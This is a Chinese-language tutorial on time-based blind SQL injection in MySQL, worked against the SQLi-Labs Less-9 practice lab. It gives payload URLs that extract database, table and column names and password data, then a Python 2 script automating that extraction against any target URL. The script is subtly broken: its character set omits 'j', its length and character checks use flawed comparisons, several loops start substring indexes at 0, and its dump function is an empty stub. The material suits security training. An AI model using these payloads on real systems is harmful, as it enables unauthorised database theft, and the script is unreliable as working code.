简介

慎用 sleep

继上一篇SQL报错型盲注之后，本篇介绍一下MySQL的时间盲注。[附验证脚本]


函数说明

  • if(1,2,3)：如果1真，则执行2，否则执行3

  • sleep(x)：执行延迟x秒

  • ascii(): 将字符串的第一个字符转换成ASCII码的形式


测试

SQLi-Labs level9

  1. 爆当前数据库长度


http://127.0.0.1:10080/Less-9/?id=1' and if(length(database())>7, 1, sleep(3))--+

因为数据库名长度大于7，请求执行 if 条件为真，执行 1，所以请求正常返回，时间是2ms。

http://127.0.0.1:10080/Less-9/?id=1' and if(length(database())>8, 1, sleep(3))--+

因为数据库名长度大于8，请求执行 if 条件为假，执行 sleep(3)，所以请求延时，时间是3001ms。所以数据库名长度不大于8个字符。


通过两条语句判断当前数据库名长度为8个字符。



  1. 爆数据库名


http://127.0.0.1:10080/Less-9/?id=1' and if(ascii(substr((select schema_name from information_schema.schemata limit 0,1), 1, 1))=105, sleep(2),1)--+

可以看到当 ascii=105时，执行了 sleep，可以判断第一个数据库名的第一个字符为 i，依次判断可得到完整数据库名。


  1. 爆表名


http://127.0.0.1:10080/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,sleep(2),1)--+

可以看到当 ascii=101时，执行了 sleep，可以判断 'security' 数据库的第一个表名的第一个字符为 e，依次判断可得到完整的表名。


  1. 爆列名


http://127.0.0.1:10080/Less-9/?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))=105, sleep(2), 1)--+

可以看到当 ascii=105时，执行了 sleep，可以判断 'security' 数据库的 ‘users’ 的第一列的第一个字符为 i，依次判断可得到完整的列名。


  1. 爆数据


http://127.0.0.1:10080/Less-9/?id=1' and if(ascii(substr((select password from users limit 0,1),1,1))=68,sleep(3),1)--+

可以看到当 ascii=68时，执行了 sleep，可以判断 password 列第一项数据的第一个字符为 D，依次判断可得到完整的数据。


验证脚本

# -*- coding:utf -*-
# Description:Time based sqli script for sqli-labs less 9


import requests
import optparse
import time


headers = {
    "user-agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)"}
chars = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'


def getCurrentDatabase(url):

    database = ''
    for l in range(1, 20):
        length_url = url + '\'' + 'and if(length(database())>{0}, \
            1, sleep(3))--+'
        length_url_format = length_url.format(l)
        start = time.time()
        requests.get(length_url_format, headers=headers)
        if time.time() - start > 2.5:
                print '[+] Current database length is ' + str(l)
                length = l
                break
        else:
            pass

    for i in range(1, length+1):

        for char in chars:
            char_ascii = ord(char)
            payload = url + "' and if(ascii(substr(database(),{0},1))>{1}, \
                    1,sleep(3))--+"
            urlformat = payload.format(i, char_ascii)
            start = time.time()
            requests.get(urlformat, headers=headers)

            if time.time() - start > 2.5:
                database += char
                print 'database: ', database
                break
            else:
                pass

    print '[+] Current database is ' + database


def getDatabases(url):

    databases = []

    for db_index in range(0, 20):
        db = ''
        for i in range(0, 20):
            for char in chars:
                char_ascii = ord(char)
                payload = url + "'and if(ascii(substr((select schema_name from \
                information_schema.schemata limit {0},1),{1},1))={2},\
                sleep(3),1)--+"
                payload_format = payload.format(db_index, i, char_ascii)
                start = time.time()
                requests.get(payload_format, headers=headers)

                if time.time() - start > 2.5:
                    db += char
                    print 'db: ', db
                else:
                    pass

        if db == '':
            break
        else:
            print '[+] database is ' + db
            databases.append(db)

    print '\n'
    print '[+] databases:'
    for item in databases:
        print '\t%s' % item


def getTables(url, db_name):

    tables = []

    for table_index in range(0, 20):
        table = ''
        for i in range(0, 20):
            for char in chars:
                char_ascii = ord(char)
                payload = url + "' and if(ascii(substr((select table_name from \
                    information_schema.tables where table_schema='%s' \
                    limit {0},1),{1},1))={2},sleep(3),1)--+" % db_name
                payload_format = payload.format(table_index, i, char_ascii)
                start = time.time()
                requests.get(payload_format, headers=headers)

                if time.time() - start > 2.5:
                    table += char
                    print 'table: ', table
                else:
                    pass

        if table == '':
            break
        else:
            print '[+] table is ' + table
            tables.append(table)

    print '\n'
    print '[+] tables:'
    for item in tables:
        print '\t%s' % item


def getColumns(url, db_name, table_name):

    columns = []

    for column_index in range(0, 20):
        column = ''
        for i in range(0, 30):
            for char in chars:
                char_ascii = ord(char)
                payload = url + "' and if(ascii(substr((select column_name from \
                    information_schema.columns where table_schema='%s' and \
                    table_name='%s' limit {0},1),{1},1))={2}, \
                    sleep(3), 1)--+" % (db_name, table_name)
                payload_format = payload.format(column_index, i, char_ascii)
                start = time.time()
                requests.get(payload_format, headers=headers)

                if time.time() - start > 2.5:
                    column += char
                    print 'column: ', column
                else:
                    pass

        if column == '':
            break
        else:
            print '[+] column is ' + column
            columns.append(column)

    print '\n'
    print '[+] columns:'
    for item in columns:
        print '\t%s' % item


def dumpData(url, db_name, table_name, columns_name):
    pass


def main():

    parser = optparse.OptionParser('python %prog ' + '-h <manual>')

    parser.add_option('-u', dest='tgt_url',
                      type='string', help='input the target url')
    parser.add_option('--dbs', dest='databases',
                      action='store_true', help='get databases')
    parser.add_option('--tables', dest='tables',
                      action='store_true', help='get tables')
    parser.add_option('--columns', dest='columns',
                      action='store_true', help='get columns')
    parser.add_option('-D', dest='database',
                      type='string', help='choose a database')
    parser.add_option('-T', dest='table',
                      type='string', help='choose a table')
    parser.add_option('-C', dest='column',
                      type='string', help='choose column(s)')
    parser.add_option('--dump', dest='data',
                      action='store_true', help='get data')

    (options, args) = parser.parse_args()

    url = options.tgt_url
    dbs = options.databases
    tables = options.tables
    columns = options.columns
    db = options.database
    table = options.table
    column = options.column
    data = options.data

    if url and (dbs is None and db is None and
                tables is None and table is None and
                columns is None and column is None and
                data is None):
        getCurrentDatabase(url)
    if url and dbs:
        getDatabases(url)
    if url and db and tables:
        getTables(url, db)
    if url and db and table and columns:
        getColumns(url, db, table)
    if url and db and table and column and data:
        dumpData(url, db, table, column)


if __name__ == '__main__':
    main()
